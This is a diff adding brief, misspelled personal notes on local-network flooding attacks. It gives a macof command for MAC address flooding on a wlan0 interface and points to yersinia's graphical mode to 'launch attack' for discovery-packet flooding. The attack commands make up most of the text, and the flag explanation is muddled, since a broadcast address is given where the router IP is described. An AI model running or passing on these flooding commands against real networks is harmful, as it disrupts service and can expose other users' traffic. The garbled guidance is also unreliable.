@@ -1,0 +1,18 @@
+macof
+
+for mac address flood
+
+macof -i (interface) wlan0 -s (attacking to router ip use ifconfig to check wlan0 brodcast ip )  192.168.1.255 
+
+# macof -i wlan0 -s 192.168.1.255
+
+
+discover flooding
+
+discovery pakeg send flooding
+
+yersinia
+
+yersinia -G (graphical )
+
+tap on launch attack 
